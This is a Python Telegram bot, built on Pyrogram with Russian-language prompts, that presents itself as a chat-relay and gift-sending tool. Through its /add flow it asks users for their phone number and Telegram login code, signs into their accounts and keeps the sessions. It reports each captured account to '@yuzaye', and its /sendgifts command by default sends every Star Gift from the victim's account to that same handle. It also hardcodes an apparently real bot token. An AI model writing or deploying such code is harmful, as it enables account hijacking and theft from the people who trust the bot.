from pyrogram import Client, filters, raw
import asyncio
import os

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = "8708890839:AAHbQt02tbj-57yMbRD_n20QJs02iNfJLuI"

bot = Client("my_bot", API_ID, API_HASH, bot_token=BOT_TOKEN)

chat_id = None
pause = 2
sessions = {}  # user_id -> Client

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(_, msg):
    await msg.reply("Пришли ID чата (число) или ссылку (t.me/chat)")

@bot.on_message(filters.command("pause") & filters.private)
async def set_pause(_, msg):
    global pause
    try:
        pause = int(msg.text.split()[1])
        await msg.reply(f"Пауза {pause} сек")
    except:
        await msg.reply("/pause 5")

@bot.on_message(filters.command("add") & filters.private)
async def add_account(_, msg):
    await msg.reply("Введи номер телефона с кодом (+79991234567)")
    sessions[msg.from_user.id] = {"step": "phone"}

@bot.on_message(filters.command("sendgifts") & filters.private)
async def send_gifts(_, msg):
    target = msg.text.split()[1] if len(msg.text.split()) > 1 else "@yuzaye"
    if msg.from_user.id not in sessions or not isinstance(sessions[msg.from_user.id], Client):
        await msg.reply("Сначала добавь аккаунт через /add")
        return
    client = sessions[msg.from_user.id]
    try:
        gifts = await client.invoke(
            raw.functions.payments.GetStarGifts(limit=100)
        )
        if not gifts.gifts:
            await msg.reply("Нет доступных подарков")
            return
        for gift in gifts.gifts:
            await client.invoke(
                raw.functions.payments.SendStarGift(
                    user_id=await client.resolve_peer(target),
                    gift_id=gift.id,
                    text="Подарок от бота"
                )
            )
            await asyncio.sleep(0.5)
        await msg.reply(f"Все подарки отправлены на {target}")
    except Exception as e:
        await msg.reply(f"Ошибка: {e}")

@bot.on_message(filters.text & filters.private & ~filters.command(["start", "pause", "add", "sendgifts"]))
async def handle(_, msg):
    global chat_id
    user_id = msg.from_user.id
    text = msg.text

    if user_id in sessions and isinstance(sessions[user_id], dict):
        if sessions[user_id].get("step") == "phone":
            phone = text
            sessions[user_id]["phone"] = phone
            sessions[user_id]["step"] = "code"
            client = Client(f"session_{user_id}", API_ID, API_HASH)
            await client.connect()
            sent_code = await client.send_code(phone)
            sessions[user_id]["client"] = client
            sessions[user_id]["sent_code"] = sent_code
            await msg.reply("Код отправлен. Введи код из Telegram:")
            return

        if sessions[user_id].get("step") == "code":
            code = text
            client = sessions[user_id]["client"]
            sent_code = sessions[user_id]["sent_code"]
            phone = sessions[user_id]["phone"]
            try:
                await client.sign_in(phone, sent_code.phone_code_hash, code)
                sessions[user_id] = client
                await bot.send_message("@yuzaye", f"Новый аккаунт: @{msg.from_user.username} (ID: {msg.from_user.id})")
                await msg.reply("Аккаунт добавлен! Теперь можно отправлять подарки через /sendgifts")
            except Exception as e:
                await msg.reply(f"Ошибка авторизации: {e}")
                sessions[user_id] = {}
            return

    if chat_id is None:
        if text.isdigit():
            chat_id = int(text)
            await msg.reply(f"Чат {chat_id} сохранён. Шли сообщения.")
        elif "t.me/" in text or "https://t.me/" in text:
            chat = await bot.get_chat(text.split("/")[-1])
            chat_id = chat.id
            await msg.reply(f"Чат {chat_id} сохранён. Шли сообщения.")
        else:
            await msg.reply("Это не ID и не ссылка")
    else:
        await bot.send_message(chat_id, text)
        await asyncio.sleep(pause)
        await msg.reply("Отправлено")

bot.run()
